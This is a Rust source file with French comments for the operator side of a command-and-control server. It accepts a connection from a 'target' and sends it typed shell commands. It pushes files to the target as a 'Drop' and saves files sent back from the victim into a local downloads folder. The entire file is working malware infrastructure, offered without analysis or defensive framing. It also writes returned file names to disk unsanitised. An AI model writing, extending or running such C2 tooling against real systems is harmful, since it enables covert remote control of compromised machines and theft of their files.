use tokio::net::TcpListener;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::error::Error;
use common::Message;
use std::io::{self, Write};
use std::fs;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let addr = "0.0.0.0:8080";
    let listener = TcpListener::bind(addr).await?;
    
    println!("========================================");
    println!("   C2 SERVER READY - LISTENING ON 8080  ");
    println!("========================================");

    // On attend la connexion
    let (socket, addr) = listener.accept().await?;
    println!(">>> NOUVELLE CIBLE CONNECTÉE : {}", addr);
    println!("(Tapez 'exit' pour quitter)\n");

    let (read_half, mut write_half) = socket.into_split();
    let mut reader = BufReader::new(read_half);
    let mut line = String::new();

    loop {
        // 1. Prompt
        print!("C2@{}> ", addr);
        io::stdout().flush()?;

        // 2. Lecture clavier
        let mut user_input = String::new();
        io::stdin().read_line(&mut user_input)?;
        let cmd_text = user_input.trim();

        if cmd_text.is_empty() { continue; }
        if cmd_text == "exit" || cmd_text == "quit" {
            println!("Fermeture de la session.");
            break;
        }

        // --- DÉBUT LOGIQUE DE TRI DES COMMANDES ---
        let should_wait_for_response = true;
        
        if cmd_text.starts_with("upload ") {
            let parts: Vec<&str> = cmd_text.splitn(2, ' ').collect();
            if parts.len() < 2 {
                println!("Utilisation: upload <fichier_local>");
                continue;
            }
            let local_path = parts[1].trim();
            
            match fs::read(local_path) {
                Ok(data) => {
                    let filename = std::path::Path::new(local_path)
                                                 .file_name()
                                                 .unwrap_or_default()
                                                 .to_string_lossy()
                                                 .to_string();
                    
                    println!("Lecture de '{}' ({} octets). Envoi à la cible...", local_path, data.len());
                    
                    // On envoie le Message::File (le "Drop")
                    let msg = Message::File { name: filename, content: data };
                    let mut json = serde_json::to_string(&msg).unwrap();
                    json.push('\n');
                    
                    if write_half.write_all(json.as_bytes()).await.is_err() {
                        println!("La cible s'est déconnectée pendant l'upload !");
                        break;
                    }
                }
                Err(e) => {
                    println!("❌ ERREUR LECTURE FICHIER LOCAL : {}", e);
                    continue; // On continue la boucle sans attendre de réponse de l'agent
                }
            }
        } else {
            // Commande normale (dir, whoami, download, screenshot...)
            // 3. Envoi commande
            let msg = Message::Command(cmd_text.to_string());
            let mut json = serde_json::to_string(&msg).unwrap();
            json.push('\n');

            if write_half.write_all(json.as_bytes()).await.is_err() {
                println!("La cible s'est déconnectée !");
                break;
            }
        }
        // --- FIN LOGIQUE DE TRI DES COMMANDES ---


        // 4. Lecture réponse (uniquement si une commande ou un upload a été envoyé)
        if should_wait_for_response {
            line.clear();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    println!("La cible s'est déconnectée !");
                    break;
                }
                Ok(_) => {
                    println!("DEBUG RAW REÇU : {}", line.trim());

                    let response_json = line.trim();
                    match serde_json::from_str::<Message>(response_json) {
                        Ok(resp_msg) => {
                            match resp_msg {
                                Message::Output(content) => {
                                    println!("{}", content);
                                },
                                Message::File { name, content } => {
                                    println!("Reçu fichier : {} ({} octets)", name, content.len());
                                    
                                    // Création du dossier downloads s'il n'existe pas
                                    if let Err(e) = fs::create_dir_all("downloads") {
                                        println!("❌ Impossible de créer le dossier downloads : {}", e);
                                    }

                                    // Sauvegarde dans le dossier downloads
                                    let file_path = format!("downloads/{}", name);
                                    match fs::write(&file_path, content) {
                                        Ok(_) => println!("✅ Fichier enregistré dans '{}' !", file_path),
                                        Err(e) => println!("❌ Erreur d'écriture : {}", e),
                                    }
                                },
                                Message::Error(err) => println!("ERREUR DISTANTE : {}", err),
                                _ => {}
                            }
                        },
                        Err(e) => println!("❌ Erreur décodage JSON : {}", e),
                    }
                }
                Err(e) => {
                    println!("Erreur de lecture réseau : {}", e);
                    break;
                }
            }
        }
    }

    Ok(())
}